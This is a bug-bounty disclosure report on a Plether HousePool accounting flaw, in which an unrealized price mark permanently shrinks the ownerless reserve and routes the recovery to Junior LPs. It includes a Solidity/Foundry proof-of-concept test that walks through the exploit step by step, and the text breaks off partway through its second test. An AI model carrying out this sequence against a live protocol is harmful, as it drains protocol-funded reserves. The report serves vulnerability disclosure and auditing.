# \#98615 [SC-Medium] Ownerless HousePool reserve is permanently consumed by an unrealized mark and its recovery is paid to Junior

**Submitted on Nov 9th 2026 at 02:53:42 UTC by @Cryptor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98615
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

HousePool holds value that has no LP claimant in an explicit `unassignedAssets` bucket. The bucket is reserved from LP withdrawals, it blocks new tranche deposits while it is nonzero, and the only route from it to LP ownership is the owner-gated `assignUnassignedAssets`, whose own documentation states that it exists to prevent "later LPs from implicitly capturing previously ownerless value" (`HousePool.sol:657`).

On every fresh-mark reconciliation the bucket is clamped down to current terminal distributable equity (`HousePoolReconcilePlanLib.sol:73-74`). Nothing ever raises it again. Senior principal in the same function is protected against exactly this: `absorbLoss` leaves `seniorHighWaterMark` untouched through a loss "so future revenue continues to restore senior impairment" (`HousePoolWaterfallAccountingLib.sol:162-163`), and `distributeRevenue` refills that gap before anything reaches Junior. The ownerless bucket has no high-water mark, no shortfall record, and no place in the restoration order, so the clamp is one-way.

The result is that a basket price round trip with no realized trader profit moves protocol-funded reserve assets permanently out of `unassignedAssets` and credits the recovery to Junior principal through the ordinary surplus waterfall. An incumbent Junior holder then redeems it as USDG. Both the write-down and the payout are reachable through permissionless calls: a keeper `OrderRouter.settleLpEpoch` while a trader position is marked in the trader's favour, then an ordinary Junior redemption after the mark reverts.

The proof of concept reaches this state from ordinary market activity and the protocol's own documented recovery procedure: valid one percent basket moves impair Junior fully and Senior partially, the owner recapitalizes for exactly the recorded Senior high-water gap, an unrelated trader's ordinary round trips restore part of Senior before that funding is allocated, and the excess is quarantined as ownerless. No privileged function is called by the attacker, no incorrect oracle price is supplied, and no production source is modified.

## Severity

The value lost is pool cash the protocol has recognized in `accountedAssets`, reserved from every LP withdrawal path, and deliberately withheld from tranche ownership until the owner assigns it. A permissionless sequence converts that reserve into one LP's redeemable claim and pays it out in settlement token. In the proof of concept a single mark round trip moves 1,798.756011 USDG out of the reserve and into a Junior redemption, against a 160.240138 USDG round-trip cost for the trader who provides the marked position. Four consecutive round trips move 4,376.052029 USDG. The reserve is monotone non-increasing, so the bound on total loss is the reserve balance itself (998,784.000000 USDG in the proof of concept), not the per-cycle amount.

The mapped impact is **Medium: griefing (damage to the users or the protocol)**. The protocol loses recognized reserve assets it can no longer recover: after the round trip `HousePool.excessAssets()` is zero and `accountExcess()` reverts with `HousePool__NoExcessAssets`, so there is no unaccounted cash to re-admit, and `assignUnassignedAssets` can only mint shares against the reduced balance. Restoring the diverted amount would require the owner to fund it again.

The Critical theft tier is not claimed: `unassignedAssets` has no assigned recipient at the time of the loss, so no identified user's enforceable claim is taken. The High tier is not claimed either: the reserve in this witness is owner-funded recapitalization capital rather than accrued yield. The defect also fires with no attacker at all. Whenever Junior principal sits near zero and the reserve dominates pool equity, ordinary basket volatility ratchets the reserve down on each adverse LP settlement and hands every subsequent recovery to Junior, which is continuing damage to the protocol rather than a one-off event.

## Vulnerability details

### The reserve is clamped down and never restored

`buildReconcileSnapshot` folds the signed terminal mark-to-close delta into distributable equity, so distributable equity moves with the mark while an open position exists:

```
// packages/perps/src/libraries/HousePoolAccountingLib.sol:60
function buildReconcileSnapshot(...) internal pure returns (ReconcileSnapshot memory snapshot) {
    uint256 terminalAssets = engineSnapshot.physicalAssets;
    uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
    int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;      // :65
    ...
    snapshot.distributable = terminalAssets - terminalLiabilities;         // :74
}
```

`planReconcile` then clamps the ownerless bucket to that number and distributes only what is above it:

```
// packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:73
plan.state.unassignedAssets =
    state.unassignedAssets > snapshot.distributable ? snapshot.distributable : state.unassignedAssets;
...
uint256 distributableToClaims = snapshot.distributable > plan.state.unassignedAssets   // :84
    ? snapshot.distributable - plan.state.unassignedAssets
    : 0;
```

`HousePool._reconcile` writes the clamped value straight to storage:

```
// packages/perps/src/HousePool.sol:1584
_setWaterfallState(plan.state.waterfall);
unassignedAssets = plan.state.unassignedAssets;                            // :1585
```

Senior is handled the opposite way in the same library. A loss leaves the Senior entitlement intact:

```
// packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:161
/// @dev Absorbs loss against junior principal first and senior principal second. ... The senior high-water mark is
///      deliberately unchanged so future revenue continues to restore senior impairment.
```

and a recovery refills that entitlement before Junior receives anything:

```
// packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:140
if (remaining > 0 && nextState.seniorPrincipal < nextState.seniorHighWaterMark) {
    uint256 deficit = nextState.seniorHighWaterMark - nextState.seniorPrincipal;
    uint256 restore = remaining < deficit ? remaining : deficit;
    nextState.seniorPrincipal += restore;                                  // :149
    remaining -= restore;
}
...
nextState.juniorPrincipal += remaining;                                    // :158
```

There is no `unassignedHighWaterMark`, no shortfall field in `PendingAccountingState`, and no branch in `distributeRevenue` that returns value to the reserve. Every unit the clamp takes out of the reserve re-enters the waterfall on the way back up and ends in Junior principal.

### The invariant that breaks

The source that routes recapitalization states the invariant directly:

```
// packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:103
/// @dev ... Any remainder, including all value when there are no senior owners, becomes
///      unassigned; recapitalization never accrues to junior principal. Mutates `state` in place.
```

The clamp plus the surplus waterfall is a two-step route from that same remainder into Junior principal, with no intervening assignment. The proof of concept measures the two quantities independently and they are equal atom for atom.

The adjacent guard in `_reconcile` shows the design already treats implicit Junior credit of ownerless value as a defect, but it keys on share supply rather than on an ownerless shortfall, so it does not fire here:

```
// packages/perps/src/HousePool.sol:1591
uint256 juniorRevenueWithoutOwners = HousePoolReconcilePlanLib.juniorRevenueWithoutOwners(plan);
if (juniorRevenueWithoutOwners > 0) {
    juniorPrincipal -= juniorRevenueWithoutOwners;
    unassignedAssets += juniorRevenueWithoutOwners;                        // :1594
}
```

`juniorRevenueWithoutOwners` is nonzero only when the revenue plan's captured Junior share supply was zero. In the state this report exercises, Junior shares exist and are live; only Junior *principal* is zero. The guard returns zero and the ownerless recovery is credited to those live shares.

### Root cause

1. `HousePoolReconcilePlanLib.planReconcile` reduces `unassignedAssets` to current terminal distributable equity on every fresh mark (`src/libraries/HousePoolReconcilePlanLib.sol:73-74`) and keeps no record of how much of the reduction came from an unrealized trader mark.
2. `HousePool._reconcile` persists the reduced value (`src/HousePool.sol:1585`).
3. On the rebound, `distributableToClaims` is computed against the reduced reserve (`src/libraries/HousePoolReconcilePlanLib.sol:84-85`), so the recovered equity is classified as waterfall surplus.
4. `HousePoolWaterfallAccountingLib.distributeRevenue` restores the Senior high-water gap and credits the remainder to Junior principal (`src/libraries/HousePoolWaterfallAccountingLib.sol:146-158`). The reserve is not a participant in that order.
5. The only path that was designed to move ownerless value into tranche ownership, `HousePool.assignUnassignedAssets` (`src/HousePool.sol:660`), is `onlyOwner` and mints matching shares. It is never invoked on this path.

### The commit step

The write-down becomes storage only when a reconciliation actually runs with a fresh mark. `OrderRouter.settleLpEpoch` is the permissionless entry point that refreshes the oracle and the engine mark atomically and then reconciles (`src/OrderRouter.sol:479`), and it reverts with `HousePool__NoLpEpochProgress` when no LP epoch advances (`src/HousePool.sol:1184`).

A matured Junior redemption whose NAV has been marked to zero supplies that progress without paying anything out. The redemption-funding phase refunds the zero-value head and increments the processed-epoch counter:

```
// packages/perps/src/HousePool.sol:968
if (vault.refundRedeemEpochRemainder(epochId, remainingShares) != remainingShares) {
    revert HousePool__VaultSettlementInvariant();
}
...
phase.processedEpochs += 1;                                                // :985
```

The refund returns the shares to the holder, so the same shares are reused to collect the rebound in the next epoch.

## Attack scenario

Starting state, reached in the proof of concept from ordinary market activity and the documented owner recovery: `unassignedAssets` is nonzero, Junior principal is zero, Junior shares are live and held by an incumbent LP, and Senior holds only its seed. New tranche deposits are closed while the reserve is nonzero (`HousePool.sol:473`, `_canAcceptTrancheDeposits`), so the beneficiary has to be an existing Junior holder.

1. A trader opens a position through the public Router path at the current mark. In the proof of concept this is a 200,000-notional Short at a 1.00 basket price, inside the configured `maxSkewRatio`.
2. The incumbent Junior holder queues an ordinary redemption for its shares and waits out the epoch.
3. The basket moves one percent in the trader's favour. Any address calls `OrderRouter.settleLpEpoch` with the matching Pyth update. Terminal distributable equity falls below the reserve, the reserve is clamped down by the difference, and the matured Junior request is refunded at zero value, which is the epoch progress the guard requires.
4. The basket returns to the entry mark. The trader closes at the price it opened at, realizing no price gain, and the engine records no trader claim.
5. The Junior holder claims its refunded shares, waits the ordinary cooldown, requests redemption again, and a settlement at the unchanged mark funds it. The payout includes the full amount that left the reserve.
6. Steps 1 to 5 repeat. Each adverse settlement clamps the reserve again and each rebound routes the recovery to Junior.

Steps 1, 3, 4, and 5 are all public calls. The owner's only involvement is the earlier recapitalization, which is the protocol's documented recovery procedure for a recorded Senior high-water gap (`SECURITY.md:1212-1214`, `ACCOUNTING_SPEC.md:639-645`), executed for exactly the amount read from on-chain state.

The out-of-scope rule for privileged roles excludes impacts "requiring access to privileged addresses" and impacts that "require a malicious or compromised privileged role". Neither applies. The attacker holds no role, the owner is not malicious, the owner chooses no attacker-supplied amount, and the owner gains nothing; the owner performs the documented cure for a real impairment and the code then mishandles the remainder. The reserve has other origins as well, including the `juniorRevenueWithoutOwners` route at `HousePool.sol:1591-1595` and admitted excess through `accountExcess`, and the defect reported here applies to any reserve balance however it arose. It is reproduced from the recapitalization route because that is the origin the protocol documents as its normal source.

## Impact

Recognized, reserved, protocol-funded pool assets are converted into a Junior LP's redeemable claim and withdrawn, without the owner assignment that the protocol requires for that transfer and without any realized trader profit to justify the reduction. Measured on the release configuration:

| Measure | USDG |
|---|---:|
| Owner recapitalization, exactly the recorded Senior gap | 1,089,116.807978 |
| `unassignedAssets` before the adverse settlement | 998,784.000000 |
| `unassignedAssets` after the adverse settlement and the rebound | 996,985.243989 |
| Reserve removed, permanent | **1,798.756011** |
| Junior payout with no adverse settlement (same-state counterfactual) | 79.789964 |
| Junior payout after the adverse settlement and the rebound | 1,878.545975 |
| Extra Junior payout caused by the adverse settlement | **1,798.756011** |
| Round-trip account cost of the trader providing the marked position | 160.240138 |
| Net value moved out of the reserve after that cost | **1,638.515873** |

The extra Junior payout equals the reserve reduction exactly, which separates this transfer from the ordinary trading revenue both branches collect. Over four consecutive round trips the reserve loses 4,376.052029 USDG while the trader pays 640.961176 USDG in total, and the reserve never recovers at any point. The per-cycle amount scales with open interest and the size of the basket move and is capped by `maxSkewRatio` against pool depth; the cumulative amount is capped only by the reserve balance.

The same leak occurs without an attacker. Any trader's open position plus ordinary basket volatility produces the same clamp on each adverse keeper settlement, and every recovery accrues to whoever holds Junior shares at the time.

## Relation to documented limitations and known issues

The program treats `packages/perps/SECURITY.md` Known Limitations and the listed audit reports as known issues, and allows a report whose root cause is documented only where the fix at `a82d4fef` is incomplete or introduces a new bug.

`SECURITY.md` does not describe this behaviour. Its Known Limitations cover LP allocation and rounding at a granular level, including a one-atom bound on retained Senior high-water protection per funded pass (`SECURITY.md:1417-1419`), and its accounting section states that the recapitalization inflow path "cannot mint new senior LP shares, and excess value continues through the canonical claimant/unassigned routing" (`SECURITY.md:1212-1214`). Neither that text nor `ACCOUNTING_SPEC.md` states that a reserve balance already standing in `unassignedAssets` may be permanently consumed by an unrealized mark. `ACCOUNTING_SPEC.md` requires the reverse: "value with no valid claimant path must sit in explicit `unassignedAssets`" (`:315`), "source semantics decide the owner of the inflow" (`:647`), "only value with no safe claimant path belongs in `unassignedAssets`" (`:650`), and the bucket "should be exceptional telemetry, not a normal operating bucket" (`:652`). Its reconciliation order also places the bucket outside the waterfall entirely, step 2 being to "[c]ompare terminal equity, excluding reserved pending claimant inflows and `unassignedAssets`, with total principal" (`:335`). The rebound in this report is routed through that waterfall only because the bucket was first reduced below the value it held.

The `planReconcile` NatSpec does document the clamp itself ("unassigned assets are capped to remaining distributable value", `HousePoolReconcilePlanLib.sol:35-36`). The reported defect is not the clamp. It is the absence of any restoration for the clamped amount while the same function restores Senior from its high-water mark, and the resulting route from recapitalization remainder into Junior principal that `HousePoolPendingPreviewLib.sol:107` states cannot happen.

The closest published entries are distinct in root cause:

| Published issue | Its root cause and impact | This report | Why its fix does not stop this path |
|---|---|---|---|
| Cecuro LOW-65, owner can misroute ownerless pool assets to the junior seed receiver | `initializeSeedPosition` skipped `_reconcile`, so distributable value that was **not yet quarantined** was absorbed into Junior principal at seed time. Owner-triggered, one shot at seeding | The reserve is **already stored** in `unassignedAssets`, Junior shares already exist, and a **permissionless** settlement reduces that stored balance | The fix reconciles before Junior seeding. It is present at `a82d4fef` and runs only at seeding. It cannot restore a stored reserve balance after a mark rebound |
| Cecuro MED-12, mixed recovery inflows can strand LP revenue in ownerless pool assets | A stale `allowRevenueContinuation` decision parked realized **LP revenue** as ownerless, the opposite direction of value flow | Ownerless value becomes LP-owned. The response to MED-12 explicitly confirms that "surplus without eligible owners remains unassigned" is the intended routing, which is the state this report starts from | Recomputing revenue continuation after recapitalization does not record or restore a reserve balance that a later mark reduced |
| Cecuro MED-26, owner can activate trading against ownerless assets | Initial `activateTrading` admitted trader risk while ownerless cash already existed | Trading was activated long before the reserve existed. Ownerless value arising while trading continues is permitted, and this report accepts that operating state | The initial-activation gate does not run on a live market and does not change reconciliation |
| Cecuro MED-24, LP can delay other redeemers with zero-payout refunds | Refund epochs consume the bounded settlement work budget and delay later redeemers | One refund is used as the epoch progress that lets an otherwise reverting reconciliation commit. No other redeemer is delayed | The accepted work-cap limitation says nothing about the ownerless ledger or about restoration priority |
| SC Audit Studio SC-L1, permissionless zero-value senior withdraw can persist overstated tranche principal | Pending claimant buckets were applied after mark-to-market without a cap, overstating stored principal | The pending buckets have fully settled before the mark. A later mark reduces an existing reserve balance and the rebound credits Junior | Capping pending buckets by settleable marked equity neither retains nor restores a reduced reserve balance |

The Cecuro entries are in `audits/txt/plether-ai-audit-report-2026-10-26.txt`; SC-L1 is in `audits/txt/plether-pre-audit-report.txt`. The published AI scan (`audits/txt/scan-plether-fi-plether-core-d4541b49.md`), the collaborative report, and the Cantina report contain no entry mentioning `unassignedAssets`.

LOW-65 is the closest on stated harm, since it also ends with ownerless value becoming Junior-owned, and it was rated Low. Three differences bear on severity here. LOW-65 required the owner to call `initializeSeedPosition` at a specific moment and could only fire once, at seeding, on value that had never been quarantined. This path needs no privileged call at the time of the loss, fires on value the protocol has already classified as ownerless and reserved, and repeats on every adverse LP settlement for as long as the reserve exists.


## Proof of Concept

## Proof of Concept

One file, added to the frozen commit with no other change. It compiles and passes against the pristine repository: no production source is touched, `test/perps/BasePerpTest.sol` is used unmodified, and no `vm.mockCall` appears anywhere.

Notes on the fixture, for the "no mocks" requirement:

- `setUp` asserts the release risk parameters and pool limits from `script/DeployPerpsArbitrumSepolia.s.sol` (`vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, `maintMarginBps` 10, `initMarginBps` 20, `fadMarginBps` 300, `baseCarryBps` 500, `maxSeniorExposureAssets` 40,000,000e6, `maxSeniorShareBps` 8000). The starting pool is 40,000,000 USDG, 30,000,000 Senior and 10,000,000 Junior, inside both of those limits.
- `MockSettlementToken` stands in for USDG. The Arbitrum Sepolia release deploys `MockUSDG`, an ordinary six-decimal ERC20; neither applies custom logic.
- `MockPyth` is Pyth Network's canonical local price contract, used by the whole repository test suite. The production `PletherOracle` reads it through the real staleness, confidence-width, and divergence checks. No oracle response is faked and every price is a coordinated local update at a round basket level.
- Every value-moving call goes through a public entry point: `router.commitOrder`, `router.executeOrder`, `router.updateMarkPrice`, `router.settleLpEpoch`, `pool.settleLpEpoch`, `seniorVault.requestRedeem`, `juniorVault.requestRedeem`, `juniorVault.claimRedeemRefund`. The `vm.prank` targets are externally owned addresses any user controls. The single owner call, `engine.recapitalizePool`, is the documented recovery procedure and its amount is read from `pool.seniorHighWaterMark() - pool.seniorPrincipal()`.
- Settlement callers match the contract's own access rules. Direct `pool.settleLpEpoch(0, 0)` calls happen only at zero open interest, which `HousePool.sol:794-796` documents as permissionless from the cached mark. The one settlement that runs while a position is open goes through `router.settleLpEpoch`, which is permissionless and refreshes the oracle and the Engine mark atomically.
- The basket price convention is the protocol's own: `CfdMath.calculateExactPnl` makes a `Side.SHORT` position profitable as the basket price rises (`src/CfdMath.sol:61-66`). The attacking trader therefore opens a Short at 1.00, is marked in profit at 1.01, and closes back at 1.00.

The primary test carries its own same-state counterfactual through `vm.snapshotState`, so the measured transfer is the difference between two branches of identical pre-mark state: one where the position closes at its entry mark before any adverse LP settlement, and one where a public settlement happens first.

File: `packages/perps/test/bounty/ownerless/OwnerlessReserveReboundToJunior.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// Ownerless HousePool reserve is permanently written down by an unrealized mark and the rebound is paid to Junior.
contract OwnerlessReserveReboundToJunior is BasePerpTest {

    address internal longAcct = address(0xA11CE);
    address internal shortAcct = address(0xB0B);
    address internal juniorLp = address(0xBEEF); // incumbent Junior holder and beneficiary
    address internal seniorLp = address(0x5E1);
    address internal keeper = address(0x5EEDED);
    address internal revTrader = address(0xC0FFEE);
    address internal attacker = address(0xA77ACC);

    uint256 internal constant SCALE = 20; // 40m USDG starting pool
    uint256 internal constant SENIOR_GAP_TARGET = 1_000_000e6;
    uint256 internal constant REVENUE_ROUNDS = 16;
    uint256 internal constant ATTACK_SIZE = 10_000e18 * SCALE; // 200,000 notional at 1.00

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 0.01e18;
        p.maxSkewRatio = 0.4e18;
        p.maintMarginBps = 10;
        p.initMarginBps = 20;
        p.fadMarginBps = 300;
        p.baseCarryBps = 500;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }

    function setUp() public virtual override {
        super.setUp();
        // Release pool limits (script/DeployPerpsArbitrumSepolia.s.sol:78-79).
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior exposure cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share ceiling");
        // Release risk parameters (script/DeployPerpsArbitrumSepolia.s.sol:434-446).
        (
            uint256 vpiFactor,
            uint256 maxSkewRatio,
            uint256 maintMarginBps,
            uint256 initMarginBps,
            uint256 fadMarginBps,
            uint256 baseCarryBps,
            ,
            ,
            ,
        ) = engine.riskParams();
        assertEq(vpiFactor, 0.01e18, "release vpiFactor");
        assertEq(maxSkewRatio, 0.4e18, "release maxSkewRatio");
        assertEq(maintMarginBps, 10, "release maintMarginBps");
        assertEq(initMarginBps, 20, "release initMarginBps");
        assertEq(fadMarginBps, 300, "release fadMarginBps");
        assertEq(baseCarryBps, 500, "release baseCarryBps");
    }

    function _marginFor(uint256 size) internal pure returns (uint256) {
        return size * 12 / 1e18 * 1e5;
    }

    function _openAt(address a, CfdTypes.Side side, uint256 size, uint256 price) internal {
        vm.prank(a);
        uint64 id = router.commitOrder(side, size, _marginFor(size), 0, false);
        bytes[] memory data = _mockPythUpdateData(price);
        uint256 fee = pletherOracle.getOrderExecutionFee(data);
        vm.deal(keeper, fee);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory r = router.executeOrder{value: fee}(id, data);
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "open executed");
    }

    function _closeAtPrice(address a, CfdTypes.Side side, uint256 size, uint256 price) internal {
        vm.prank(a);
        uint64 id = router.commitOrder(side, size, 0, 0, true);
        bytes[] memory data = _mockPythUpdateData(price);
        uint256 fee = pletherOracle.getOrderExecutionFee(data);
        vm.deal(keeper, fee);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory r = router.executeOrder{value: fee}(id, data);
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "close executed");
    }

    function _mark(uint256 price) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        uint256 fee = pletherOracle.getUpdateFee(data);
        vm.deal(keeper, fee);
        vm.prank(keeper);
        router.updateMarkPrice{value: fee}(data);
    }

    /// Permissionless keeper LP settlement carrying an atomic oracle and mark refresh.
    function _settleAt(uint256 price) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        uint256 fee = pletherOracle.getUpdateFee(data);
        vm.deal(keeper, fee);
        vm.prank(keeper);
        router.settleLpEpoch{value: fee}(data);
    }

    /// Ordinary market activity: repeated valid 1% basket moves impair Junior fully and Senior partially.
    function _impairSeniorThroughOrdinaryPrices() internal {
        _fundJunior(juniorLp, 500_000e6 * SCALE);
        _fundSenior(seniorLp, 1_500_000e6 * SCALE);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _fundTrader(longAcct, 4_000_000e6 * SCALE);
        _fundTrader(shortAcct, 4_000_000e6 * SCALE);

        uint256 rounds;
        while (rounds < 120) {
            uint256 size = pool.totalAssets() * 35 / 100 * 1e12;
            size -= size % CfdTypes.SIZE_QUANTUM;
            _openAt(longAcct, CfdTypes.Side.LONG, size, 1e8);
            _openAt(shortAcct, CfdTypes.Side.SHORT, size, 1e8);
            _closeAtPrice(longAcct, CfdTypes.Side.LONG, size, 0.99e8);
            _closeAtPrice(shortAcct, CfdTypes.Side.SHORT, size, 1.01e8);
            ++rounds;
            (uint256 projectedSenior,,,) = pool.getPendingTrancheState();
            if (projectedSenior + SENIOR_GAP_TARGET < pool.seniorHighWaterMark()) break;
            _mark(1e8);
        }
        emit log_named_uint("ordinary 1% precursor rounds", rounds);
        assertFalse(engine.degradedMode(), "no degraded mode");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no outstanding trader claims");
    }

    /// Reaches the launch-reachable state: a quarantined ownerless reserve, live Junior shares at zero principal.
    function _buildOwnerlessReserve() internal returns (uint256 ownerless) {
        _impairSeniorThroughOrdinaryPrices();

        // Persist the real Senior impairment through an ordinary LP epoch.
        uint256 firstShares = seniorVault.maxRequestRedeem(seniorLp) / 100;
        vm.prank(seniorLp);
        uint256 firstId = seniorVault.requestRedeem(firstShares, seniorLp, seniorLp);
        vm.warp(seniorVault.depositEpochStart(firstId) + 1);
        pool.settleLpEpoch(0, 0);

        // Documented owner recovery, for exactly the recorded Senior high-water gap.
        uint256 exactGap = pool.seniorHighWaterMark() - pool.seniorPrincipal();
        assertGt(exactGap, 0, "recorded Senior gap");
        settlementToken.mint(address(this), exactGap);
        settlementToken.approve(address(engine), exactGap);
        engine.recapitalizePool(exactGap);
        emit log_named_uint("owner recapitalization, exact Senior gap", exactGap);

        // An unrelated trader's ordinary round trips restore part of Senior before the recap is allocated, so the
        // remainder of the owner's funding has no claimant and is quarantined.
        _fundTrader(revTrader, 500_000e6 * SCALE);
        uint256 revenueSize = 300_000e18 * SCALE;
        for (uint256 i; i < REVENUE_ROUNDS; ++i) {
            if (i != 0) _mark(1e8);
            _openAt(revTrader, CfdTypes.Side.LONG, revenueSize, 1e8);
            _closeAtPrice(revTrader, CfdTypes.Side.LONG, revenueSize, 1.01e8);
        }

        // The Senior LP's ordinary full exit leaves the quarantined reserve and the already-wiped Junior shares.
        uint256 seniorExitShares = seniorVault.maxRequestRedeem(seniorLp);
        vm.prank(seniorLp);
        uint256 seniorExitId = seniorVault.requestRedeem(seniorExitShares, seniorLp, seniorLp);
        vm.warp(seniorVault.depositEpochStart(seniorExitId) + 1);
        pool.settleLpEpoch(0, 0);

        ownerless = pool.unassignedAssets();
        emit log_named_uint("unassignedAssets after the routine cure and revenue", ownerless);
        assertGt(ownerless, 0, "ownerless reserve exists");
        assertEq(pool.juniorPrincipal(), 0, "Junior principal wiped by the market losses");
        assertGt(juniorVault.maxRequestRedeem(juniorLp), 0, "the incumbent Junior holder still has shares");
    }

    function test_ownerlessReserveReboundIsCreditedToJunior() public {
        uint256 ownerlessBefore = _buildOwnerlessReserve();

        _fundTrader(attacker, 50_000e6 * SCALE);
        uint256 traderBefore = clearinghouse.balanceAssets(attacker);
        _openAt(attacker, CfdTypes.Side.SHORT, ATTACK_SIZE, 1e8);

        uint256 seniorBefore = pool.seniorPrincipal();
        uint256 seniorHwm = pool.seniorHighWaterMark();

        // The incumbent Junior holder queues an ordinary redemption and lets it mature.
        uint256 triggerShares = juniorVault.maxRequestRedeem(juniorLp);
        vm.prank(juniorLp);
        uint256 triggerId = juniorVault.requestRedeem(triggerShares, juniorLp, juniorLp);
        vm.warp(juniorVault.depositEpochStart(triggerId) + 1);

        // Same-state counterfactual: the position closes at its entry mark before any adverse LP settlement.
        uint256 snap = vm.snapshotState();
        _closeAtPrice(attacker, CfdTypes.Side.SHORT, ATTACK_SIZE, 1e8);
        pool.settleLpEpoch(0, 0);
        uint256 noMarkPaid = juniorVault.claimableRedeemAssets(triggerId, juniorLp);
        assertEq(pool.unassignedAssets(), ownerlessBefore, "without the adverse settlement the reserve is intact");
        emit log_named_uint("counterfactual Junior payout, no adverse settlement", noMarkPaid);
        assertTrue(vm.revertToState(snap));

        // Permissionless keeper settlement while the position is marked in the trader's favour.
        _settleAt(1.01e8);
        uint256 ownerlessAfter = pool.unassignedAssets();
        emit log_named_uint("unassignedAssets after the adverse mark", ownerlessAfter);
        assertLt(ownerlessAfter, ownerlessBefore, "the ownerless reserve was written down");
        assertEq(pool.seniorPrincipal(), 0, "Senior principal was also wiped by the same mark");
        assertEq(pool.seniorHighWaterMark(), seniorHwm, "Senior keeps its high-water entitlement");
        assertGt(juniorVault.refundableRedeemRequest(triggerId, juniorLp), 0, "zero-value request is refundable");

        // The position closes at the mark it opened at. No trader price gain is ever realized.
        _closeAtPrice(attacker, CfdTypes.Side.SHORT, ATTACK_SIZE, 1e8);
        assertEq(engine.lastMarkPrice(), 1e8, "the basket is back at the entry mark");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claim was created");

        // The Junior holder recovers its refunded shares and redeems after the ordinary cooldown.
        vm.prank(juniorLp);
        juniorVault.claimRedeemRefund(triggerId, juniorLp, juniorLp);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        uint256 exitShares = juniorVault.maxRequestRedeem(juniorLp);
        vm.prank(juniorLp);
        uint256 exitId = juniorVault.requestRedeem(exitShares, juniorLp, juniorLp);
        vm.warp(juniorVault.depositEpochStart(exitId) + 1);
        pool.settleLpEpoch(0, 0);
        uint256 paid = juniorVault.claimableRedeemAssets(exitId, juniorLp);
        uint256 traderCost = traderBefore - clearinghouse.balanceAssets(attacker);

        emit log_named_uint("Junior payout after the rebound", paid);
        emit log_named_uint("attacking trader round-trip cost", traderCost);
        emit log_named_uint("ownerless reserve written down", ownerlessBefore - ownerlessAfter);
        emit log_named_uint("extra Junior payout versus the counterfactual", paid - noMarkPaid);

        // The asymmetry control: Senior's impairment from the same mark was restored in full, the reserve's was not.
        assertEq(pool.seniorPrincipal(), seniorBefore, "Senior impairment fully restored on the rebound");
        assertEq(pool.unassignedAssets(), ownerlessAfter, "the reserve write-down is permanent");

        // The reserve reduction became Junior redemption value, atom for atom.
        assertEq(paid - noMarkPaid, ownerlessBefore - ownerlessAfter, "reserve reduction == extra Junior payout");
        assertGt(paid - noMarkPaid, traderCost, "the transfer exceeds the trader's round-trip cost");

        // The owner cannot recover the diverted value: no unaccounted cash appeared in the pool.
        assertEq(pool.excessAssets(), 0, "no unaccounted cash to re-admit");
        vm.expectRevert(IHousePool.HousePool__NoExcessAssets.selector);
        pool.accountExcess();
    }

    /// Each adverse LP settlement ratchets the ownerless reserve down again. The leak is not a single event: the
    /// reserve is monotone non-increasing, every recovery is routed to Junior, and the bound is the reserve balance.
    function test_repeatedMarkRoundTripsRatchetTheReserveDown() public {
        uint256 ownerlessStart = _buildOwnerlessReserve();
        _fundTrader(attacker, 200_000e6 * SCALE);
        uint256 traderStart = clearinghouse.balanceAssets(attacker);

        uint256 cumulativePaid;
        uint256 previousOwnerless = ownerlessStart;
        for (uint256 cycle; cycle < 4; ++cycle) {
            _openAt(attacker, CfdTypes.Side.SHORT, ATTACK_SIZE, 1e8);

            uint256 triggerShares = juniorVault.maxRequestRedeem(juniorLp);
            vm.prank(juniorLp);
            uint256 triggerId = juniorVault.requestRedeem(triggerShares, juniorLp, juniorLp);
            vm.warp(juniorVault.depositEpochStart(triggerId) + 1);

            _settleAt(1.01e8);
            _closeAtPrice(attacker, CfdTypes.Side.SHORT, ATTACK_SIZE, 1e8);

            if (juniorVault.refundableRedeemRequest(triggerId, juniorLp) > 0) {
                vm.prank(juniorLp);
                juniorVault.claimRedeemRefund(triggerId, juniorLp, juniorLp);
            }
            vm.warp(vm.getBlockTimestamp() + 1 hours + 1);

            uint256 exitShares = juniorVault.maxRequestRedeem(juniorLp) / 2;
            vm.prank(juniorLp);
            uint256 exitId = juniorVault.requestRedeem(exitShares, juniorLp, juniorLp);
            vm.warp(juniorVault.depositEpochStart(exitId) + 1);
            pool.settleLpEpoch(0, 0);
            // Funded redemption cash is escrowed in the vault and irrevocably reserved for this claim.
            uint256 paid = juniorVault.claimableRedeemAssets(exitId, juniorLp);
            cumulativePaid += paid;

            uint256 ownerlessNow = pool.unassignedAssets();
